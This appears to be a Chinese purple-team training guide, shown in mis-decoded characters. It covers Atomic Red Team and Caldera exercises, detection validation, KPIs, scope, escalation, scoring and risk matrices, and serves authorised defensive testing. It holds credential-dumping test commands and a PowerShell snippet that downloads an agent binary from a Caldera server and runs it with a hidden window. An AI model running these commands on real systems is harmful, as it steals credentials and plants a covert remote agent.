<h4 id="ç´«é˜Ÿä½œæˆ˜ç”»å¸ƒpurple-team-canvas"><a class="header" href="#ç´«é˜Ÿä½œæˆ˜ç”»å¸ƒpurple-team-canvas">ç´«é˜Ÿä½œæˆ˜ç”»å¸ƒï¼ˆPurple Team Canvasï¼‰</a></h4>
<div class="table-wrapper"><table><thead><tr><th>åŒºåŸŸ</th><th>æ ¸å¿ƒå†…å®¹</th><th>è´Ÿè´£äºº</th></tr></thead><tbody>
<tr><td>æ¼”ç»ƒç›®æ ‡</td><td>ä¸šåŠ¡åœºæ™¯ã€å…³é”®èµ„äº§ã€æˆåŠŸå‡†åˆ™</td><td>ç™½é˜Ÿ/ä¸šåŠ¡è´Ÿè´£äºº</td></tr>
<tr><td>æ”»å‡»å‡è®¾</td><td>å¯¹åº”çš„MITREæˆ˜æœ¯ã€æ”»å‡»è·¯å¾„ã€å·¥å…·</td><td>çº¢é˜Ÿ</td></tr>
<tr><td>æ£€æµ‹å‡è®¾</td><td>é¢„æœŸè§¦å‘è§„åˆ™ã€æ•°æ®æºã€æ—¥å¿—å­—æ®µ</td><td>è“é˜Ÿ</td></tr>
<tr><td>éªŒè¯æ–¹å¼</td><td>åŸå­åŒ–æµ‹è¯•ã€Calderaä»»åŠ¡ã€è„šæœ¬</td><td>ç´«é˜Ÿ</td></tr>
<tr><td>æˆåŠŸæ ‡å‡†</td><td>æ£€æµ‹æ—¶é—´ã€å‘Šè­¦çº§åˆ«ã€å“åº”åŠ¨ä½œ</td><td>è“é˜Ÿ/ç™½é˜Ÿ</td></tr>
<tr><td>æ”¹è¿›è®¡åˆ’</td><td>å·¥å…·æ›´æ–°ã€æµç¨‹ä¼˜åŒ–ã€åŸ¹è®­éœ€æ±‚</td><td>ç´«é˜Ÿç»Ÿç­¹</td></tr>
</tbody></table>
</div>
<blockquote>
<p>ç´«é˜Ÿæ˜¯â€œç¿»è¯‘å®˜â€ä¸â€œæ•™ç»ƒâ€ï¼Œæ ¸å¿ƒåœ¨äºæŠŠä¸€æ¬¡æ¬¡æ”»é˜²å¯¹æŠ—è½¬åŒ–ä¸ºå¯æµ‹é‡ã€å¯è¿½è¸ªçš„æ”¹è¿›è¿­ä»£ã€‚</p>
</blockquote>
<h3 id="41-ç´«é˜Ÿæ¦‚å¿µ"><a class="header" href="#41-ç´«é˜Ÿæ¦‚å¿µ">4.1 ç´«é˜Ÿæ¦‚å¿µ</a></h3>
<p><strong>ç´«é˜Ÿä½œç”¨</strong>:</p>
<pre><code>1. çŸ¥è¯†å…±äº«
   - çº¢é˜Ÿåˆ†äº«æ”»å‡»æŠ€æœ¯
   - è“é˜Ÿåˆ†äº«æ£€æµ‹æ–¹æ³•
   - å…±åŒæå‡èƒ½åŠ›

2. ååŒæ¼”ç»ƒ
   - å—æ§ç¯å¢ƒä¸‹æ”»é˜²
   - å®æ—¶åé¦ˆä¼˜åŒ–
   - å¿«é€Ÿè¿­ä»£æ”¹è¿›

3. å·¥å…·å¼€å‘
   - æ”»å‡»æ¨¡æ‹Ÿå·¥å…·
   - æ£€æµ‹è§„åˆ™ä¼˜åŒ–
   - è‡ªåŠ¨åŒ–å“åº”

4. æŒç»­æ”¹è¿›
   - å®šæœŸè¯„ä¼°é˜²å¾¡
   - æ›´æ–°æ£€æµ‹è§„åˆ™
   - å®Œå–„å“åº”æµç¨‹
</code></pre>
<h3 id="42-ååŒæ¼”ç»ƒ"><a class="header" href="#42-ååŒæ¼”ç»ƒ">4.2 ååŒæ¼”ç»ƒ</a></h3>
<p><strong>Atomic Red Team</strong>:</p>
<pre><code class="language-powershell"># Atomic Red Team - åŸå­åŒ–æ”»å‡»æµ‹è¯•

# å®‰è£…
Install-Module -Name invoke-atomicredteam -Scope CurrentUser
Import-Module invoke-atomicredteam

# åˆ—å‡ºæ‰€æœ‰æµ‹è¯•
Invoke-AtomicTest All -ShowDetailsBrief

# æ‰§è¡Œç‰¹å®šæµ‹è¯•ï¼ˆT1003 - Credential Dumpingï¼‰
Invoke-AtomicTest T1003

# ä»…æ˜¾ç¤ºæµ‹è¯•è¯¦æƒ…ï¼Œä¸æ‰§è¡Œ
Invoke-AtomicTest T1003 -ShowDetails

# æ¸…ç†æµ‹è¯•ç—•è¿¹
Invoke-AtomicTest T1003 -Cleanup

# è‡ªå®šä¹‰æµ‹è¯•
Invoke-AtomicTest T1003.001 -InputArgs @{
    "output_file" = "C:\temp\credentials.txt"
}

# æ‰¹é‡æ‰§è¡Œæµ‹è¯•
$tests = @("T1003", "T1059", "T1055")
foreach ($test in $tests) {
    Write-Host "[*] æ‰§è¡Œæµ‹è¯•: $test"
    Invoke-AtomicTest $test

    # ç­‰å¾…è“é˜Ÿæ£€æµ‹
    Start-Sleep -Seconds 60

    # æ¸…ç†
    Invoke-AtomicTest $test -Cleanup
}
</code></pre>
<p><strong>Calderaè‡ªåŠ¨åŒ–å¯¹æŠ—å¹³å°</strong>:</p>
<pre><code class="language-yaml"># Calderaæ“ä½œé…ç½®

# 1. å®‰è£…Caldera
git clone https://github.com/mitre/caldera.git
cd caldera
pip3 install -r requirements.txt
python3 server.py --insecure

# 2. è®¿é—®ç•Œé¢
http://localhost:8888

# 3. éƒ¨ç½²Agent
# Windows
server="http://caldera-server:8888"
agent="sandcat"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$data=$wc.DownloadData($url)
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9)
[io.file]::WriteAllBytes("$env:TEMP\$name",$data)
Start-Process -FilePath $env:TEMP\$name -ArgumentList "-server $server -group red" -WindowStyle hidden

# 4. åˆ›å»ºå¯¹æŠ—è¡ŒåŠ¨
operation:
  name: "APTæ¨¡æ‹Ÿ"
  group: "red"
  planner: "atomic"
  adversary: "APT29"

  facts:
    - trait: "host.user.name"
      value: "administrator"
    - trait: "domain.controller"
      value: "dc.internal.com"

  steps:
    - technique: "T1078"  # Valid Accounts
      executor: "psh"

    - technique: "T1003"  # Credential Dumping
      executor: "psh"

    - technique: "T1021"  # Remote Services
      executor: "psh"

# 5. ç›‘æ§æ‰§è¡Œ
# Calderaæä¾›å®æ—¶æ‰§è¡Œç›‘æ§å’Œç»“æœæ”¶é›†
</code></pre>
<h3 id="ç´«é˜Ÿè”åŠ¨èŠ‚å¥å»ºè®®"><a class="header" href="#ç´«é˜Ÿè”åŠ¨èŠ‚å¥å»ºè®®">ç´«é˜Ÿè”åŠ¨èŠ‚å¥å»ºè®®</a></h3>
<div class="table-wrapper"><table><thead><tr><th>å‘¨æœŸ</th><th>æ­¥éª¤</th><th>ä¸»è¦ä»»åŠ¡</th><th>äº§å‡º</th></tr></thead><tbody>
<tr><td>Day 0 (Kick-off)</td><td>ç›®æ ‡å¯¹é½</td><td>æ˜ç¡®ä¸šåŠ¡åœºæ™¯ã€æ”»é˜²ä¸»é¢˜ã€æ•°æ®æºæ¥å…¥</td><td>æ”»é˜²ç›®æ ‡æ¸…å•ã€æ•°æ®å‡†å¤‡è®¡åˆ’</td></tr>
<tr><td>Day 1-2</td><td>æ”»å‡»è„šæœ¬å‡†å¤‡</td><td>çº¢é˜Ÿç¼–å†™Atomic/Calderaè„šæœ¬ï¼Œç™½é˜Ÿç¡®è®¤å®‰å…¨é˜ˆå€¼</td><td>æ”»å‡»è„šæœ¬ã€å›æ»šæ–¹æ¡ˆ</td></tr>
<tr><td>Day 3</td><td>æ”»å‡»æ‰§è¡Œ</td><td>çº¢é˜Ÿæ‰§è¡Œåœºæ™¯æ”»å‡»ï¼Œè“é˜Ÿå®æ—¶è§‚å¯Ÿå¹¶è®°å½•æ—¥å¿—</td><td>æ”»å‡»æ—¥å¿—ã€æ£€æµ‹è®°å½•</td></tr>
<tr><td>Day 4</td><td>æ£€æµ‹éªŒè¯</td><td>è“é˜Ÿè°ƒè¯•è§„åˆ™ã€SOARæµç¨‹ï¼ŒéªŒè¯å‘Šè­¦ä¸è‡ªåŠ¨åŒ–å“åº”</td><td>æ£€æµ‹éªŒè¯æŠ¥å‘Šã€è¯¯æŠ¥æ¸…å•</td></tr>
<tr><td>Day 5</td><td>æ”¹è¿›è¿­ä»£</td><td>ç´«é˜Ÿä¸»æŒå¤ç›˜ï¼Œå½¢æˆè¡ŒåŠ¨é¡¹å¹¶åˆ†é…è´£ä»»äºº</td><td>æ”¹è¿›è®¡åˆ’ã€æŒ‡æ ‡æ›´æ–°</td></tr>
</tbody></table>
</div>
<h3 id="æ£€æµ‹éªŒè¯è®°å½•æ¨¡æ¿detection-validation-record"><a class="header" href="#æ£€æµ‹éªŒè¯è®°å½•æ¨¡æ¿detection-validation-record">æ£€æµ‹éªŒè¯è®°å½•æ¨¡æ¿ï¼ˆDetection Validation Recordï¼‰</a></h3>
<pre><code class="language-markdown">- åœºæ™¯ç¼–å·ï¼šPT-2024-001
- MITREæ˜ å°„ï¼šT1059.001 PowerShellã€T1047 WMI
- æ”»å‡»æè¿°ï¼šä½¿ç”¨PowerShellä¸‹è½½æ‰§è¡Œpayloadï¼Œéšåé€šè¿‡WMIæ¨ªå‘ç§»åŠ¨
- æœŸæœ›æ£€æµ‹ï¼š
  - è§„åˆ™Aï¼ˆEDR-PS-Encodedï¼‰ï¼šå‘½ä¸­ï¼Œä¸¥é‡çº§
  - è§„åˆ™Bï¼ˆSIEM-WMI-Execï¼‰ï¼šæœªå‘½ä¸­
- å®é™…ç»“æœï¼š
  - AæˆåŠŸè§¦å‘ï¼Œå“åº”è€—æ—¶12åˆ†é’Ÿ
  - Bæœªè§¦å‘ï¼ŒåŸå› ï¼šç¼ºå°‘4292äº‹ä»¶æ—¥å¿—
- æ”¹è¿›æªæ–½ï¼š
  - å¼€å¯ç›®æ ‡ä¸»æœºWMIæ—¥å¿—
  - æ–°å¢Sigmaè§„åˆ™`wmi_remote_process_creation`
  - å°†æ£€æµ‹çº³å…¥SOAR Playbook
- å¤æµ‹è®¡åˆ’ï¼šæ”¹åŠ¨å®Œæˆå48å°æ—¶å†…å¤æµ‹
</code></pre>
<h3 id="æ”»é˜²è”åŠ¨æŒ‡æ ‡purple-kpi"><a class="header" href="#æ”»é˜²è”åŠ¨æŒ‡æ ‡purple-kpi">æ”»é˜²è”åŠ¨æŒ‡æ ‡ï¼ˆPurple KPIï¼‰</a></h3>
<ul>
<li>æ”»é˜²éªŒè¯å®Œæˆç‡ = å®ŒæˆéªŒè¯åœºæ™¯æ•° / è®¡åˆ’åœºæ™¯æ€»æ•° â‰¥ 90%</li>
<li>æ£€æµ‹è¾¾æ ‡ç‡ = æˆåŠŸè§¦å‘æ£€æµ‹çš„åœºæ™¯æ•° / æ€»åœºæ™¯æ•° â‰¥ 75%</li>
<li>ç¼©çŸ­å‘¨æœŸ = ä»åœºæ™¯æå‡ºåˆ°æ£€æµ‹ä¸Šçº¿å¹³å‡æ—¶é—´ â‰¤ 10å¤©</li>
<li>è¡ŒåŠ¨é¡¹å…³é—­ç‡ = 30å¤©å†…å…³é—­æ”¹è¿›é¡¹ / æ”¹è¿›é¡¹æ€»æ•° â‰¥ 85%</li>
</ul>
<hr />
<h2 id="æ¨¡å—äº”å¯¹æŠ—æ¼”ç»ƒè®¾è®¡ä¸è½åœ°"><a class="header" href="#æ¨¡å—äº”å¯¹æŠ—æ¼”ç»ƒè®¾è®¡ä¸è½åœ°">æ¨¡å—äº”ï¼šå¯¹æŠ—æ¼”ç»ƒè®¾è®¡ä¸è½åœ°</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆæ¼”ç»ƒè§†è§’"><a class="header" href="#æ¨¡å—æ€»è§ˆæ¼”ç»ƒè§†è§’">æ¨¡å—æ€»è§ˆï¼ˆæ¼”ç»ƒè§†è§’ï¼‰</a></h3>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šä»æˆ˜ç•¥åˆ°æ‰§è¡Œå…¨é¢è®¾è®¡çº¢è“å¯¹æŠ—æ¼”ç»ƒè®¡åˆ’ï¼Œç¡®ä¿â€œå¯æ§ã€å¯æµ‹ã€å¯å¤ç°â€ï¼Œå¹¶å°†ä¸šåŠ¡å½±å“æ§åˆ¶åœ¨å¯æ¥å—èŒƒå›´å†…ã€‚</li>
<li><strong>æ ¸å¿ƒäº¤ä»˜ç‰©</strong>ï¼š
<ul>
<li>æ¼”ç»ƒè®¡åˆ’ä¹¦ï¼ˆç›®æ ‡ã€èŒƒå›´ã€æ—¶é—´ã€èµ„æºã€é£é™©æ§åˆ¶ï¼‰</li>
<li>æ²Ÿé€šä¸æ±‡æŠ¥æœºåˆ¶ï¼ˆæ—¥æŠ¥ã€å‘¨æŠ¥ã€å‘Šè­¦å‡çº§æµç¨‹ï¼‰</li>
<li>è¯æ®ä¸æŒ‡æ ‡åº“ï¼ˆæ—¥å¿—ã€æˆªå›¾ã€æ—¶é—´çº¿ã€è¯„åˆ†è¡¨ï¼‰</li>
<li>æ¼”ç»ƒæŠ¥å‘Šã€æ”¹è¿›è®¡åˆ’ã€æŒ‡æ ‡è·Ÿè¸ªè¡¨</li>
</ul>
</li>
<li><strong>å…³é”®æµç¨‹</strong>ï¼šDefine â†’ Prepare â†’ Execute â†’ Evaluate â†’ Improveã€‚</li>
</ul>
<h4 id="æ¼”ç»ƒç­¹å¤‡ä¹æ­¥æ³•"><a class="header" href="#æ¼”ç»ƒç­¹å¤‡ä¹æ­¥æ³•">æ¼”ç»ƒç­¹å¤‡ä¹æ­¥æ³•</a></h4>
<ol>
<li>æ˜ç¡®ä¸šåŠ¡ç›®æ ‡ä¸æŒ‡æ ‡ï¼ˆå¦‚æ”»å‡»é¢ç¼©å‡ã€æ£€æµ‹æ—¶å»¶&lt;15åˆ†é’Ÿï¼‰ã€‚</li>
<li>æ¢³ç†å…³é”®èµ„äº§ã€æ•°æ®åˆ†çº§ä¸ä¾›åº”é“¾ä¾èµ–ï¼Œå»ºç«‹ä¼˜å…ˆçº§çŸ©é˜µã€‚</li>
<li>å®Œæˆé£é™©è¯„ä¼°ä¸å½±å“çŸ©é˜µï¼Œè®¾å®šä¸­æ­¢æ¡ä»¶ä¸å›æ»šæ–¹æ¡ˆã€‚</li>
<li>è®¾è®¡æ”»å‡»/é˜²å¾¡åœºæ™¯ä¸å¯¹åº”æˆåŠŸåˆ¤å®šæ ‡å‡†ã€‚</li>
<li>å‡†å¤‡æ¼”ç»ƒç¯å¢ƒï¼ˆé¶åœºã€VPNã€æ—¥å¿—ç®¡é“ã€å¿«ç…§/å¤‡ä»½ã€æ¼”ç»ƒå·¥å•ç³»ç»Ÿï¼‰ã€‚</li>
<li>å»ºç«‹é€šä¿¡æ¸ é“ã€å€¼ç­è¡¨ã€è¯æ®å‘½åè§„èŒƒåŠæ–‡æ¡£æ¨¡æ¿ã€‚</li>
<li>è¿›è¡Œæ¡Œé¢æ¼”ç»ƒï¼ˆTabletopï¼‰æˆ–çº¢è“å½±å­æ¼”ç»ƒé¢„æ¼”ã€‚</li>
<li>æ­£å¼è¿è¡Œæ¼”ç»ƒå¹¶ä½¿ç”¨Runbookè®°å½•æ¯ä¸ªè¡ŒåŠ¨ã€æ—¶é—´ã€å½±å“ã€‚</li>
<li>æ¼”ç»ƒç»“æŸåå¼€å±•å¤ç›˜ã€è¡ŒåŠ¨é¡¹è·Ÿè¸ªã€ç»éªŒæ²‰æ·€ä¸åŸ¹è®­ã€‚</li>
</ol>
<h3 id="51-æ¼”ç»ƒè§„åˆ’"><a class="header" href="#51-æ¼”ç»ƒè§„åˆ’">5.1 æ¼”ç»ƒè§„åˆ’</a></h3>
<h4 id="æ¼”ç»ƒèŒƒå›´å®šä¹‰"><a class="header" href="#æ¼”ç»ƒèŒƒå›´å®šä¹‰">æ¼”ç»ƒèŒƒå›´å®šä¹‰</a></h4>
<p><strong>èŒƒå›´çŸ©é˜µ</strong>:</p>
<pre><code>èµ„äº§ç±»å‹        | æ˜¯å¦åŒ…å« | é™åˆ¶æ¡ä»¶
---------------|---------|------------------
å¤–ç½‘WebæœåŠ¡å™¨   | âœ“       | ç¦æ­¢DDoSæ”»å‡»
å†…ç½‘åŠå…¬PC      | âœ“       | åŠå…¬æ—¶é—´å¤–æµ‹è¯•
åŸŸæ§åˆ¶å™¨        | âœ“       | åªè¯»æ“ä½œï¼Œç¦æ­¢ä¿®æ”¹
æ•°æ®åº“æœåŠ¡å™¨    | âœ“       | ç¦æ­¢åˆ é™¤æ•°æ®
ç”Ÿäº§ç¯å¢ƒ        | âœ—       | å®Œå…¨æ’é™¤
ç¬¬ä¸‰æ–¹ç³»ç»Ÿ      | âœ—       | æœªè·æˆæƒ
</code></pre>
<p><strong>æ—¶é—´å®‰æ’</strong>:</p>
<pre><code>é˜¶æ®µ          | æ—¶é—´       | ä¸»è¦æ´»åŠ¨
-------------|-----------|------------------
å‡†å¤‡é˜¶æ®µ      | 2å‘¨       | ç¯å¢ƒå‡†å¤‡ã€è§„åˆ™åˆ¶å®š
çº¢é˜Ÿä¾¦å¯Ÿ      | 3å¤©       | è¢«åŠ¨ä¿¡æ¯æ”¶é›†
çº¢é˜Ÿæ”»å‡»      | 7å¤©       | ä¸»åŠ¨æ¸—é€æµ‹è¯•
è“é˜Ÿç›‘æ§      | æŒç»­      | 7x24å°æ—¶ç›‘æ§
æ¯æ—¥å¤ç›˜      | æ¯æ™š1å°æ—¶  | æ€»ç»“å½“æ—¥æ”»é˜²
æœ€ç»ˆå¤ç›˜      | 2å¤©       | å…¨é¢æ€»ç»“æŠ¥å‘Š
</code></pre>
<h3 id="æ¼”ç»ƒæ§åˆ¶å¡”control-toweré…ç½®"><a class="header" href="#æ¼”ç»ƒæ§åˆ¶å¡”control-toweré…ç½®">æ¼”ç»ƒæ§åˆ¶å¡”ï¼ˆControl Towerï¼‰é…ç½®</a></h3>
<ul>
<li><strong>ä»»åŠ¡çœ‹æ¿</strong>ï¼šä½¿ç”¨Jira/Trelloè®¾ç½®æ³³é“ï¼ˆçº¢é˜Ÿã€è“é˜Ÿã€ç™½é˜Ÿã€é£é™©ï¼‰ï¼Œè®°å½•ä»»åŠ¡çŠ¶æ€ã€é˜»å¡é¡¹ä¸è´£ä»»äººã€‚</li>
<li><strong>å®æ—¶æ²Ÿé€š</strong>ï¼šå»ºç«‹ä¸“ç”¨IMç¾¤ç»„ï¼ˆé’‰é’‰/Slack/Teamsï¼‰ï¼Œé…ç½®æœºå™¨äººæ¨é€å…³é”®å‘Šè­¦ã€è¡ŒåŠ¨é¡¹ï¼Œæ‰€æœ‰è¯­éŸ³éœ€åœ¨30åˆ†é’Ÿå†…å½¢æˆçºªè¦ã€‚</li>
<li><strong>è¯æ®å­˜å‚¨</strong>ï¼šä½¿ç”¨åŠ å¯†æ–‡ä»¶åº“ï¼ˆNextcloud/SharePointï¼‰ï¼ŒæŒ‰ç…§<code>YYYYMMDD-å›¢é˜Ÿ-ç¼–å·</code>å‘½åï¼Œç™½é˜Ÿè´Ÿè´£æƒé™å®¡è®¡ä¸ç‰ˆæœ¬ç®¡ç†ã€‚</li>
<li><strong>æŒ‡æ ‡é¢æ¿</strong>ï¼šåœ¨Grafana/PowerBIå±•ç¤ºå…³é”®æŒ‡æ ‡ï¼ˆæ£€æµ‹è€—æ—¶ã€å“åº”è€—æ—¶ã€æˆåŠŸç‡ã€é£é™©è¯„åˆ†ï¼‰ï¼Œæ¯æ™šå¿«ç…§å½’æ¡£ã€‚</li>
<li><strong>é£é™©å°è´¦</strong>ï¼šç™½é˜Ÿç»´æŠ¤<code>Risk Register</code>ï¼ŒåŒ…å«é£é™©æè¿°ã€å½±å“åº¦ã€å¯èƒ½æ€§ã€ç¼“è§£æªæ–½ã€è´Ÿè´£äººã€çŠ¶æ€ã€‚</li>
</ul>
<h3 id="æ²Ÿé€šå‡çº§æµç¨‹communication-escalation"><a class="header" href="#æ²Ÿé€šå‡çº§æµç¨‹communication-escalation">æ²Ÿé€šå‡çº§æµç¨‹ï¼ˆCommunication Escalationï¼‰</a></h3>
<div class="table-wrapper"><table><thead><tr><th>ç­‰çº§</th><th>è§¦å‘æ¡ä»¶</th><th>é€šçŸ¥å¯¹è±¡</th><th>å“åº”æ—¶é™</th><th>å¤‡æ³¨</th></tr></thead><tbody>
<tr><td>L0 æ—¥å¸¸</td><td>å¸¸è§„è¡ŒåŠ¨ã€ä½é£é™©å‘Šè­¦</td><td>çº¢/è“é˜Ÿæ“ä½œå‘˜</td><td>å³æ—¶è®°å½•</td><td>æ—¥æŠ¥æ±‡æ€»</td></tr>
<tr><td>L1 è­¦ç¤º</td><td>è§¦å‘é«˜å±èµ„äº§ã€å¯èƒ½å½±å“æ•æ„Ÿæ•°æ®</td><td>çº¢/è“é˜Ÿè´Ÿè´£äººã€ç™½é˜Ÿ</td><td>10åˆ†é’Ÿå†…</td><td>å¯åŠ¨å½±å“è¯„ä¼°</td></tr>
<tr><td>L2 é‡å¤§</td><td>ä¸šåŠ¡ä¸­æ–­é£é™©ã€è¯¯æ“ä½œå½±å“ç”Ÿäº§</td><td>CISOã€ITè´Ÿè´£äººã€ä¸šåŠ¡è´Ÿè´£äºº</td><td>5åˆ†é’Ÿå†…</td><td>è¯„ä¼°æ˜¯å¦æš‚åœæ¼”ç»ƒ</td></tr>
<tr><td>L3 å±æœº</td><td>å®é™…é€ æˆé‡å¤§å½±å“æˆ–èˆ†æƒ…é£é™©</td><td>é«˜ç®¡ã€æ³•åŠ¡ã€PR</td><td>ç«‹å³</td><td>è¿›å…¥åº”æ€¥å“åº”æµç¨‹</td></tr>
</tbody></table>
</div>
<blockquote>
<p>æ‰€æœ‰å‡çº§éœ€è®°å½•åœ¨æ¼”ç»ƒæ—¥å¿—ä¸­ï¼ŒåŒ…å«æ—¶é—´ã€è§¦å‘åŸå› ã€æªæ–½ã€ç»“æœï¼›æ¼”ç»ƒç»“æŸåçº³å…¥å¤ç›˜ææ–™ã€‚</p>
</blockquote>
<h3 id="52-æŒ‡æ ‡ä½“ç³»ä¸è¯„åˆ†æ¨¡å‹"><a class="header" href="#52-æŒ‡æ ‡ä½“ç³»ä¸è¯„åˆ†æ¨¡å‹">5.2 æŒ‡æ ‡ä½“ç³»ä¸è¯„åˆ†æ¨¡å‹</a></h3>
<div class="table-wrapper"><table><thead><tr><th>ç»´åº¦</th><th>æŒ‡æ ‡</th><th>è¯„åˆ†æ ‡å‡†</th><th>è¯´æ˜</th></tr></thead><tbody>
<tr><td>çº¢é˜ŸæˆåŠŸç‡</td><td>æ”»å‡»è·¯å¾„å®Œæˆåº¦</td><td>æˆåŠŸå®Œæˆå®Œæ•´é“¾è·¯å¾—20åˆ†ï¼›éƒ¨åˆ†å®Œæˆ10åˆ†ï¼›å¤±è´¥0åˆ†</td><td>æ ¹æ®æ”»å‡»é“¾æ¡æ•°é‡ç´¯è®¡</td></tr>
<tr><td>çº¢é˜Ÿéšè”½æ€§</td><td>è¢«æ£€æµ‹æ—¶å»¶</td><td>æœªè¢«å‘ç°å¾—20åˆ†ï¼›è¢«å‘ç°ä½†&gt;2å°æ—¶10åˆ†ï¼›&lt;2å°æ—¶5åˆ†</td><td>éœ€è®°å½•æ£€æµ‹æ—¶é—´</td></tr>
<tr><td>è“é˜Ÿæ£€æµ‹ç‡</td><td>å‘Šè­¦å‘½ä¸­</td><td>å…³é”®é˜¶æ®µå‘Šè­¦20åˆ†ï¼›éƒ¨åˆ†å‘½ä¸­10åˆ†ï¼›æœªå‘½ä¸­0åˆ†</td><td>ç»“åˆåº”æ€¥å·¥å•</td></tr>
<tr><td>è“é˜Ÿå“åº”</td><td>å“åº”æ—¶æ•ˆ</td><td>&lt;30åˆ†é’Ÿ20åˆ†ï¼›30-60åˆ†é’Ÿ10åˆ†ï¼›&gt;60åˆ†é’Ÿ5åˆ†</td><td>ä»¥SOAR/å·¥å•æ—¶é—´ä¸ºå‡†</td></tr>
<tr><td>ååŒæ”¹è¿›</td><td>è¡ŒåŠ¨é¡¹äº¤ä»˜</td><td>30å¤©å†…å®Œæˆ&gt;90%è¡ŒåŠ¨é¡¹20åˆ†ï¼›70%-90% 10åˆ†ï¼›&lt;70% 5åˆ†</td><td>ç™½é˜Ÿè·Ÿè¸ª</td></tr>
</tbody></table>
</div>
<p><strong>æ•°æ®æ”¶é›†æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨æ¼”ç»ƒæ§åˆ¶å¡”çœ‹æ¿è‡ªåŠ¨ç»Ÿè®¡åˆ†æ•°ï¼Œæ”¯æŒå¯¼å‡ºCSVã€‚</li>
<li>æ¯å¤©ä¾‹ä¼šæ›´æ–°å¾—åˆ†ï¼Œé˜²æ­¢é—æ¼ã€‚</li>
<li>åˆ†æé«˜åˆ†/ä½åˆ†åŸå› ï¼Œå½¢æˆç»éªŒåº“ã€‚</li>
</ul>
<h3 id="53-æ¼”ç»ƒæ–‡æ¡£ä¸æ—¶é—´çº¿ç¤ºä¾‹"><a class="header" href="#53-æ¼”ç»ƒæ–‡æ¡£ä¸æ—¶é—´çº¿ç¤ºä¾‹">5.3 æ¼”ç»ƒæ–‡æ¡£ä¸æ—¶é—´çº¿ç¤ºä¾‹</a></h3>
<pre><code>2024-05-06 (Day 0)
09:00 Kick-offä¼šè®®ï¼Œç¡®è®¤æˆæƒä¹¦ä¸ä¸­æ­¢æ¡ä»¶
13:30 çº¢é˜Ÿå¼€å§‹è¢«åŠ¨ä¾¦å¯Ÿ
16:00 è“é˜Ÿå®Œæˆæ—¥å¿—å¥åº·æ£€æŸ¥

2024-05-07 (Day 1)
10:20 çº¢é˜ŸæˆåŠŸé’“é±¼ï¼Œè·å–VPNå‡­è¯
10:35 ç™½é˜Ÿè®°å½•äº‹ä»¶ç¼–å· RT-2024-001
10:50 è“é˜Ÿå°šæœªå‘ç°
14:10 è“é˜ŸSIEMå‘Šè­¦ï¼Œè§¦å‘å“åº”æµç¨‹ï¼Œå¼€å§‹éš”ç¦»è´¦å·
16:30 ç´«é˜Ÿä¼šè®®ï¼Œç¡®è®¤éœ€æ–°å¢æ£€æµ‹è§„åˆ™

2024-05-08 (Day 2)
09:15 çº¢é˜Ÿæ¨ªå‘åˆ°æ•°æ®åº“æœåŠ¡å™¨
09:20 è“é˜ŸEDRæ•è·å¼‚å¸¸ï¼Œå¯ç–‘å‘½ä»¤`sqlcmd`
09:30 è“é˜Ÿé˜»æ–­ä¼šè¯å¹¶æ”¶é›†è¯æ®
11:00 ç™½é˜Ÿæ›´æ–°é£é™©å°è´¦ï¼Œç­‰çº§L1
17:00 æ—¥æŠ¥è¾“å‡ºï¼Œåˆ—å‡º3ä¸ªè¡ŒåŠ¨é¡¹
</code></pre>
<h3 id="54-é£é™©çŸ©é˜µç¤ºä¾‹"><a class="header" href="#54-é£é™©çŸ©é˜µç¤ºä¾‹">5.4 é£é™©çŸ©é˜µç¤ºä¾‹</a></h3>
<div class="table-wrapper"><table><thead><tr><th>é£é™©ID</th><th>æè¿°</th><th>å¯èƒ½æ€§ (1-5)</th><th>å½±å“ (1-5)</th><th>é£é™©ç­‰çº§</th><th>ç¼“è§£æªæ–½</th><th>è´Ÿè´£äºº</th></tr></thead><tbody>
<tr><td>R-01</td><td>æ¼”ç»ƒå¯¼è‡´ç”Ÿäº§æ•°æ®è¢«ä¿®æ”¹</td><td>2</td><td>5</td><td>10 (é«˜)</td><td>ä»…åœ¨ä»¿çœŸç¯å¢ƒæ‰§è¡Œã€ç™½é˜Ÿå®æ—¶ç›‘æ§</td><td>ç™½é˜Ÿè´Ÿè´£äºº</td></tr>
<tr><td>R-02</td><td>é’“é±¼é‚®ä»¶è¢«å¤–éƒ¨äººå‘˜æ”¶åˆ°</td><td>3</td><td>4</td><td>12 (é«˜)</td><td>ä½¿ç”¨ç™½åå•é‚®ç®±ã€å•æ‰¹æ¬¡&lt;50å°</td><td>çº¢é˜Ÿè´Ÿè´£äºº</td></tr>
<tr><td>R-03</td><td>æ¼”ç»ƒæ—¥å¿—ä¸¢å¤±</td><td>2</td><td>4</td><td>8 (ä¸­)</td><td>ä½¿ç”¨é›†ä¸­æ—¥å¿—ä¸å¤‡ä»½</td><td>è“é˜Ÿæ—¥å¿—ç®¡ç†å‘˜</td></tr>
<tr><td>R-04</td><td>å…³é”®äººå‘˜ç¼ºå¸­</td><td>3</td><td>3</td><td>9 (ä¸­)</td><td>åˆ¶å®šæ›¿è¡¥è®¡åˆ’ã€æå‰ç¡®è®¤æ’ç­</td><td>ç™½é˜Ÿåè°ƒ</td></tr>
<tr><td>R-05</td><td>æ”»å‡»å½±å“ç”¨æˆ·ä½“éªŒ</td><td>2</td><td>3</td><td>6 (ä¸­)</td><td>åˆ¶å®šé€šçŸ¥æ¨¡æ¿ï¼Œé¢„ç•™å›æ»šæ—¶é—´</td><td>ç™½é˜Ÿ+ä¸šåŠ¡</td></tr>
</tbody></table>
</div>
<h3 id="55-æ¼”ç»ƒä¿¡æ¯æŠ«éœ²æ¨¡æ¿"><a class="header" href="#55-æ¼”ç»ƒä¿¡æ¯æŠ«éœ²æ¨¡æ¿">5.5 æ¼”ç»ƒä¿¡æ¯æŠ«éœ²æ¨¡æ¿</a></h3>
<pre><code class="language-markdown">è‡´ï¼šå…¨ä½“å‘˜å·¥
ä¸»é¢˜ï¼šå…³äºXXæ”»é˜²æ¼”ç»ƒçš„é€šçŸ¥
æ—¶é—´ï¼š2024å¹´5æœˆ6æ—¥-5æœˆ17æ—¥ï¼ˆæ¯æ—¥09:00-18:00ï¼‰
èŒƒå›´ï¼šå…¬å¸å†…ç½‘åŠå…¬ç³»ç»Ÿã€VPNã€éƒ¨åˆ†ä¸šåŠ¡ç³»ç»Ÿ
